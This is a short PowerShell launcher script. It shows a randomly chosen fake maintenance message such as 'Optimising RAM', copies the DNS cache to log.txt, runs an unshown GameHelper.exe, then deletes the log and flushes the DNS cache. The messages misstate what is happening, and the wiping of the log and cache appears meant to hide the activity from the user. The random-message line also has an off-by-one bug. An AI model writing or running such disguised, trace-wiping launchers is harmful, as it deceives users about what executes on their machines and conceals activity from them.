cd -d (Split-Path $PSCommandPath)

[String[]] $msg = @(
    "Starting system cleanup",
    "Clearing system cache",
    "Running system diagnostics",
    "Optimising RAM",
    "Starting BIOS assessment"
)

Write-Host "$($msg[(Get-Random -Minimum 0 -Maximum ($msg.Length-1))]). Do not close this window."

Invoke-Expression -Command "ipconfig /displaydns > log.txt"

&.\GameHelper.exe

Remove-Item -Path "log.txt" 2>$null
Invoke-Expression -Command "ipconfig /flushdns" | Out-Null